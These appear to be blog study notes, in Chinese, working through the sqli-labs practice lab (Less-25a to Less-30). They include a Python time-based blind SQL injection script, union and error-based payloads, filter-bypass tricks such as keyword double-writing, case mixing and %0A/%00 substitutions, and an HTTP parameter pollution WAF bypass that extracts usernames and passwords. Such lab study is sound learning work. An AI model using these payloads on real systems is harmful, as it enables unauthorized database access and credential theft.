<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <br></code></pre></td></tr></table></figure>
<p>题目可以直接联合注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(id,username,passwoorrd) <span class="hljs-keyword">from</span> users <br></code></pre></td></tr></table></figure>
<p>但是本意应该是让练习盲注的，所以修改了一下以前的脚本<br>时间盲注：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests  <span class="hljs-comment"># 导入requests库，用于发送HTTP请求</span><br><span class="hljs-keyword">import</span> time      <span class="hljs-comment"># 导入time库，用于测量时间延迟</span><br><br><span class="hljs-comment"># 定义一个包含可能字符的字符串，用于猜测数据库、表和字段的名称</span><br>ALPHABET = <span class="hljs-string">&quot;,abcdefghijklmnopqrstuvwxyz0123456789_@.-&quot;</span><br><br><span class="hljs-comment"># 定义一个时间延迟，用于判断是否存在SQL注入</span><br>SLEEP_TIME = <span class="hljs-number">1</span><br><br><span class="hljs-comment"># 定义目标URL，其中包含一个SQL注入的payload模板</span><br><span class="hljs-comment"># &#123;sql&#125;：表示要执行的SQL查询</span><br><span class="hljs-comment"># &#123;position&#125;：表示当前猜测的字符位置</span><br><span class="hljs-comment"># &#123;char&#125;：表示当前猜测的字符</span><br><span class="hljs-comment"># &#123;time&#125;：表示延迟时间</span><br>URL = <span class="hljs-string">&quot;http://localhost/sqli-labs/Less-25a/?id=1 aandnd if(substr((&#123;sql&#125;),&#123;position&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(&#123;time&#125;),1)--+&quot;</span><br><br><span class="hljs-comment"># 定义一个函数，用于发送HTTP请求并判断是否存在延迟</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inject</span>(<span class="hljs-params">path</span>):<br>    start = time.time()  <span class="hljs-comment"># 记录请求开始时间</span><br>    response = requests.get(path)  <span class="hljs-comment"># 发送HTTP GET请求</span><br>    end = time.time()   <span class="hljs-comment"># 记录请求结束时间</span><br>    <span class="hljs-comment"># 如果响应状态码为200且响应时间超过预设的延迟时间，则认为存在SQL注入</span><br>    <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span> <span class="hljs-keyword">and</span> end - start &gt; SLEEP_TIME:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># 定义一个函数，用于提取数据库、表、字段或数据</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_data</span>(<span class="hljs-params">sql</span>):<br>    s = <span class="hljs-string">&quot;&quot;</span>  <span class="hljs-comment"># 初始化一个空字符串，用于存储结果</span><br>    position = <span class="hljs-number">0</span>  <span class="hljs-comment"># 初始化字符位置计数器</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        position += <span class="hljs-number">1</span>  <span class="hljs-comment"># 每次循环增加字符位置</span><br>        <span class="hljs-comment"># 尝试猜测当前字符位置是否为空</span><br>        res = inject(URL.<span class="hljs-built_in">format</span>(sql=sql, position=position, char=<span class="hljs-string">&quot;&quot;</span>, time=SLEEP_TIME))<br>        <span class="hljs-keyword">if</span> res:<br>            <span class="hljs-keyword">break</span>  <span class="hljs-comment"># 如果为空，退出循环</span><br>        <span class="hljs-comment"># 遍历所有可能的字符</span><br>        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> ALPHABET:<br>            <span class="hljs-comment"># 构造完整的URL并发送请求</span><br>            res = inject(URL.<span class="hljs-built_in">format</span>(sql=sql, position=position, char=char, time=SLEEP_TIME))<br>            <span class="hljs-keyword">if</span> res:<br>                s += char  <span class="hljs-comment"># 如果猜测正确，将字符添加到结果字符串中</span><br>                <span class="hljs-keyword">break</span>      <span class="hljs-comment"># 退出循环，继续下一个字符</span><br>    <span class="hljs-keyword">return</span> s  <span class="hljs-comment"># 返回最终结果字符串</span><br><br><span class="hljs-comment"># 获取数据库名</span><br>database = extract_data(<span class="hljs-string">&quot;database()&quot;</span>)<br><span class="hljs-built_in">print</span>(database)  <span class="hljs-comment"># 调用extract_data函数，传入SQL查询语句获取数据库名</span><br><br><span class="hljs-comment"># 获取表名</span><br>tables = extract_data(<span class="hljs-string">&quot;select group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#x27;%s&#x27;&quot;</span> % database)<br><span class="hljs-built_in">print</span>(tables)<br><br><span class="hljs-comment"># 获取字段名</span><br>columns = extract_data(<span class="hljs-string">&quot;select group_concat(column_name) from infoorrmation_schema.columns where table_schema=&#x27;security&#x27; aandnd table_name=&#x27;users&#x27;&quot;</span>)<br><span class="hljs-built_in">print</span>(columns)<br><br><span class="hljs-comment"># 获取用户名和密码，可以替换自己想要的表名</span><br><span class="hljs-comment">#all = extract_data(&quot;select group_concat(id,username,password) from users&quot;)</span><br><span class="hljs-comment">#print(all)</span><br></code></pre></td></tr></table></figure>

<h1 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span>= preg_replace(<span class="hljs-string">&#x27;/or/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);			//strip out OR (non <span class="hljs-keyword">case</span> sensitive)</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span>= preg_replace(<span class="hljs-string">&#x27;/and/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);		//Strip out AND (non <span class="hljs-keyword">case</span> sensitive)</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);		//strip out /*</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span>= preg_replace(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);		//Strip out --</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span>= preg_replace(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);			//Strip out <span class="hljs-comment">#</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span>= preg_replace(<span class="hljs-string">&#x27;/[\s]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);		//Strip out spaces</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);		//Strip out slashes</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">sql=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-variable">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></code></pre></td></tr></table></figure>
<p>\s &#x3D; 空格<br>大概就是空格，制表符，换行符都过滤了,  </p>
<blockquote>
<p>注释可以用;%00<br>空格绕过%09 TAB键（水平）、%0a 新建一行、%0c 新的一页、%0d return功能、%0b TAB键（垂直）、%a0 空格空格，但是可能是apache解析不了(我用的也是apache)，博客上都选择报错注入加()绕过空格,就不用考虑空格<br>or 可以用 || 或 oorr<br>and 可以用 &amp;&amp; 或 aandnd  </p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-operator">||</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>(concat(username,<span class="hljs-operator">%</span><span class="hljs-number">27</span>:<span class="hljs-operator">%</span><span class="hljs-number">27</span>,passwoorrd))<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">from</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>(users)<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">where</span>(id<span class="hljs-operator">=</span><span class="hljs-number">1</span>))));<span class="hljs-operator">%</span><span class="hljs-number">00</span> <br><span class="hljs-operator">=</span><br><span class="hljs-string">&#x27;||extractvalue(1,concat(0x7e,(select(concat(username,&#x27;</span>:<span class="hljs-string">&#x27;,password))from(users)where(id=1))));</span><br><span class="hljs-string"></span><br><span class="hljs-string">https://blog.csdn.net/2301_76913435/article/details/145601627</span><br></code></pre></td></tr></table></figure>
<p>其中包含：双写or，;%00绕过注释符号</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; || updatexml(1,concat(0x0a,(SELECT(group_concat(concat_ws(0x3a,username,passwoorrd))) FROM (security.users) WHERE (id = 1) ))  ,1) || &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br><br>https:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.cnblogs.com<span class="hljs-operator">/</span>linfangnan<span class="hljs-operator">/</span>p<span class="hljs-operator">/</span><span class="hljs-number">13940107.</span>html<br></code></pre></td></tr></table></figure>
<p>其中包含：双写or，||’1’&#x3D;’1’ 来闭合语句使得不用注释，security.users来确定是security下的users</p>
<hr>
<h2 id="title-note-13date-2025-03-15-01-06-35tags-sql-labs"><a href="#title-note-13date-2025-03-15-01-06-35tags-sql-labs" class="headerlink" title="title: note-13date: 2025-03-15 01:06:35tags: sql-labs"></a>title: note-13<br>date: 2025-03-15 01:06:35<br>tags: sql-labs</h2><h1 id="less26a"><a href="#less26a" class="headerlink" title="less26a"></a>less26a</h1><p>网上博客是说用%a0来代替空格，但是我这环境好像解析不了，<br>也不能用报错注入。<br>最后试出来能用来盲注的payload就是：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;)||if(length(database())=8,1,0);%00</span><br></code></pre></td></tr></table></figure>
<p>结果牛大b了，在后面27在同样过滤了空格的情况下用其它如%a0能正确解析,可能是我的关卡文件有问题；<br>那不管了，直接做less27。  </p>
<h1 id="less27"><a href="#less27" class="headerlink" title="less27"></a>less27</h1><p>这题过滤对大小写没考虑，可以直接大小写绕过<br>题目好像把符号过滤了，用id&#x3D;-1会变成1，注意要用数据库没用的值<br>题目过滤：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);		<span class="hljs-comment">//strip out /*</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);		<span class="hljs-comment">//Strip out --.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);			<span class="hljs-comment">//Strip out #.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);	    <span class="hljs-comment">//Strip out spaces.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/select/m&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);	    <span class="hljs-comment">//Strip out spaces.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);	    <span class="hljs-comment">//Strip out spaces.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/union/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);	    <span class="hljs-comment">//Strip out union</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/select/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);	    <span class="hljs-comment">//Strip out select</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/UNION/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);	    <span class="hljs-comment">//Strip out UNION</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/SELECT/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);	    <span class="hljs-comment">//Strip out SELECT</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/Union/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);	    <span class="hljs-comment">//Strip out Union</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/Select/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);	    <span class="hljs-comment">//Strip out select</span><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br></code></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs url">?id=0&#x27;%0AunIOn%0ASeleCT%0A1,2,3;%00<br>?id=0&#x27;%0AunIOn%0ASeleCT%0A1,2,group_concat(table_name)%0Afrom%0AinfoRmation_schema.tables%0Awhere%0Atable_schema=&#x27;security&#x27;;%00<br>?id=0&#x27;%0AunIOn%0ASeleCT%0A1,2,group_concat(column_name)%0Afrom%0AinfoRmation_schema.columns%0Awhere%0Atable_name=&#x27;users&#x27;%0Aand%0Atable_schema=&#x27;security&#x27;;%00<br>?id=0&#x27;%0AunIOn%0ASeleCT%0A1,2,group_concat(id,username,passwOrd )%0Afrom%0Ausers;%00<br></code></pre></td></tr></table></figure>

<h1 id="less27a"><a href="#less27a" class="headerlink" title="less27a"></a>less27a</h1><p>依旧没用过滤大小写，区别是没用报错回显，不能用报错注入。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">?id=<span class="hljs-number">11111</span><span class="hljs-string">&quot;uNion%0AselecT<span class="hljs-variable">%0A1</span>,2,3;<span class="hljs-variable">%00</span></span><br><span class="hljs-string">?id=11111&quot;</span>uNion%0AselecT<span class="hljs-variable">%0A1</span>,database(),group_concat(table_name)from<span class="hljs-variable">%0AinfoRmation_schema</span>.tables%0Awhere<span class="hljs-variable">%0Atable_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span>;<span class="hljs-variable">%00</span><br>?id=<span class="hljs-number">11111</span><span class="hljs-string">&quot;uNion%0AselecT<span class="hljs-variable">%0A1</span>,database(),group_concat(column_name)from<span class="hljs-variable">%0AinfoRmation_schema</span>.columns%0Awhere<span class="hljs-variable">%0Atable_name</span>=&#x27;users&#x27;%0Aand<span class="hljs-variable">%0Atable_schema</span>=&#x27;security&#x27;;<span class="hljs-variable">%00</span></span><br><span class="hljs-string">?id=11111&quot;</span>uNion%0AselecT<span class="hljs-variable">%0A1</span>,database(),group_concat(id,username,password)from<span class="hljs-variable">%0Ausers</span>;<span class="hljs-variable">%00</span><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="title-note-14date-2025-03-16-00-48-04tags-sql-labs"><a href="#title-note-14date-2025-03-16-00-48-04tags-sql-labs" class="headerlink" title="title: note-14date: 2025-03-16 00:48:04tags: sql-labs"></a>title: note-14<br>date: 2025-03-16 00:48:04<br>tags: sql-labs</h2><h1 id="less28"><a href="#less28" class="headerlink" title="less28"></a>less28</h1><p>测试出闭合点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs s">?id=1&#x27;);%00<br></code></pre></td></tr></table></figure>
<p>然后看一眼源码的过滤  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);				<span class="hljs-comment">//strip out /*</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);				<span class="hljs-comment">//Strip out --.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);					<span class="hljs-comment">//Strip out #.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);	    		<span class="hljs-comment">//Strip out spaces.</span><br><span class="hljs-comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);	   		 	//Strip out spaces.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);	    		<span class="hljs-comment">//Strip out spaces.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/union\s+select/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);	    <span class="hljs-comment">//Strip out UNION &amp; SELECT.</span><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br></code></pre></td></tr></table></figure>
<p>这辉大小写绕过就没用了，<br>而且好像是这两同时出现成union select 时才会触发过滤<br>这样的话双写绕过就有点难吧<br>但是明白了原理，根据过滤机制进行绕过就ok  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs s">?id=0&#x27;)%0Auunion%0Aselectnion%0Aselect%0A1,2,3;%00<br></code></pre></td></tr></table></figure>
<p>有点奇葩，但确实能用<br>也可以选择报错注入好像(不行，没有报错)，不试了  </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;)%0Auunion%0Aselectnion%0Aselect%0A1,database(),group_concat(table_name)from%0Ainformation_schema.tables%0Awhere%0Atable_schema=&#x27;</span>security<span class="hljs-string">&#x27;;%00</span><br><span class="hljs-string">?id=0&#x27;</span>)<span class="hljs-operator">%</span><span class="hljs-number">0</span>Auunion<span class="hljs-operator">%</span><span class="hljs-number">0</span>Aselectnion<span class="hljs-operator">%</span><span class="hljs-number">0</span>Aselect<span class="hljs-operator">%</span><span class="hljs-number">0</span>A1,database(),group_concat(column_name)<span class="hljs-keyword">from</span><span class="hljs-operator">%</span><span class="hljs-number">0</span>Ainformation_schema.columns<span class="hljs-operator">%</span><span class="hljs-number">0</span>Awhere<span class="hljs-operator">%</span><span class="hljs-number">0</span>Atable_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span><span class="hljs-operator">%</span><span class="hljs-number">0</span>Aand<span class="hljs-operator">%</span><span class="hljs-number">0</span>Atable_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span>;<span class="hljs-operator">%</span><span class="hljs-number">00</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;)%0Auunion%0Aselectnion%0Aselect%0A1,database(),group_concat(id,username,password)from%0Asecurity.users;%00</span><br></code></pre></td></tr></table></figure>
<h1 id="less28a"><a href="#less28a" class="headerlink" title="less28a"></a>less28a</h1><p>看一眼源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//$id= preg_replace(&#x27;/[\/\*]/&#x27;,&quot;&quot;, $id);				//strip out /*</span><br><span class="hljs-comment">//$id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id);				//Strip out --.</span><br><span class="hljs-comment">//$id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id);					//Strip out #.</span><br><span class="hljs-comment">//$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);	    		//Strip out spaces.</span><br><span class="hljs-comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);	   		 	//Strip out spaces.</span><br><span class="hljs-comment">//$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);	    		//Strip out spaces.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/union\s+select/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);	    <span class="hljs-comment">//Strip out spaces.</span><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br></code></pre></td></tr></table></figure>
<p>好像只对union select 进行了过滤</p>
<p>payload</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?id=<span class="hljs-number">0</span>&#x27;)ununion selection <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
<p>比上关更简单，只过了union select，其它都没过滤  </p>
<h1 id="less29-waf过滤"><a href="#less29-waf过滤" class="headerlink" title="less29 waf过滤"></a>less29 waf过滤</h1><blockquote>
<p>从29到31关，要用到启动tomcat作为过滤服务器，确定参数安全后才交给apache服务器。只需将sqli-labs文件夹下的tomcat-files.zip解压到tomcat&#x2F;webapp&#x2F;ROOT目录下，启动tomcat&#x2F;bin下的startup.bat即可(关闭为shutdown.bat)。<br>by<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_76913435/article/details/145601627">https://blog.csdn.net/2301_76913435/article/details/145601627</a></p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/kukudeshuo/article/details/114763700">https://blog.csdn.net/kukudeshuo/article/details/114763700</a></p>
</blockquote>
<p>我没有跟博客去配置tomcat，但是直接用login.php来进行测试<br>好像就是同样效果，那我直接当它配置好了吧  </p>
<p>那就是输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs url">/sqli-labs/Less-29/login.php?id=1   //回显正常<br>/sqli-labs/Less-29/login.php?id=1&#x27;  //会转到hacked.php<br></code></pre></td></tr></table></figure>
<p>那大概就是waf成功阻止了此次注入<br>那就要想办法绕过waf了  </p>
<blockquote>
<p>由于tomcat和apache解析参数的顺序不同，当注入两个参数?id&#x3D;1&amp;id&#x3D;2，此时tomcat解析的是第一个参数，而apache解析的是第二个参数并且SQL语句也是在apache服务器上执行的，由此绕过tomcat的检测。<br>by<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_76913435/article/details/145601627">https://blog.csdn.net/2301_76913435/article/details/145601627</a></p>
</blockquote>
<figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs fsharp">sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-29</span><span class="hljs-operator">/</span>login.php<span class="hljs-operator">?</span><span class="hljs-built_in">id</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span><span class="hljs-built_in">id</span><span class="hljs-operator">=</span><span class="hljs-number">2</span>&#x27;<span class="hljs-operator">--+</span><br><span class="hljs-comment">//回显</span><br><span class="hljs-built_in">id</span><span class="hljs-operator">=</span><span class="hljs-number">2</span>的内容<br></code></pre></td></tr></table></figure>
<p>直接构造</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">/sqli-labs/Less<span class="hljs-number">-29</span>/login.php?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&amp;<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span>&#x27; union select <span class="hljs-number">1</span>,database(),group_concat(<span class="hljs-built_in">id</span>,username,password)<span class="hljs-keyword">from</span> security.users<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
<p>成功</p>
<h2 id="notice"><a href="#notice" class="headerlink" title="notice"></a>notice</h2><p>Web应用程序防火墙（Web Application Firewall，WAF）是一种用于保护Web应用程序的安全设备。Web应用程序是指通过Web浏览器或其他Web客户端访问的应用程序。WAF的目的是保护Web应用程序免受黑客、网络攻击和数据泄漏等安全威胁的攻击。</p>
<h1 id="less30"><a href="#less30" class="headerlink" title="less30"></a>less30</h1><p>和上一关一样有waf，但好像没有id的话就不会有回显</p>
